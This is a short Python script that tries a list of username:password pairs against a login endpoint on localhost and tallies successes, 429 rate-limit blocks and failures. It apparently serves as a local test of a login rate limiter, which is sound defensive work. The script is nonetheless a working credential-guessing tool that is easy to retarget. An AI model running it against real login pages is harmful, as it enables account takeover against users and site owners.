import requests
import time

LOGIN_URL = "http://127.0.0.1:8000/login"
GUESS_FILE = "attack/guesses.txt"

def load_guesses(path):
    pairs = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            username, password = line.split(":", 1)
            pairs.append((username, password))
    return pairs

def try_login(username, password):
    response = requests.post(LOGIN_URL, data={"username": username, "password": password})
    return response.status_code

def main():
    guesses = load_guesses(GUESS_FILE)
    hits = 0
    blocked = 0

    start = time.time()
    for username, password in guesses:
        status = try_login(username, password)
        if status == 200:
            hits += 1
            print(f"HIT: {username}:{password}")
        elif status == 429:
            blocked += 1
            print(f"BLOCKED: {username}:{password}")
        else:
            print(f"fail ({status}): {username}:{password}")

    elapsed = time.time() - start
    print("\n--- summary ---")
    print(f"attempts: {len(guesses)}")
    print(f"hits: {hits}")
    print(f"blocked (429): {blocked}")
    print(f"time: {elapsed:.2f}s")

if __name__ == "__main__":
    main()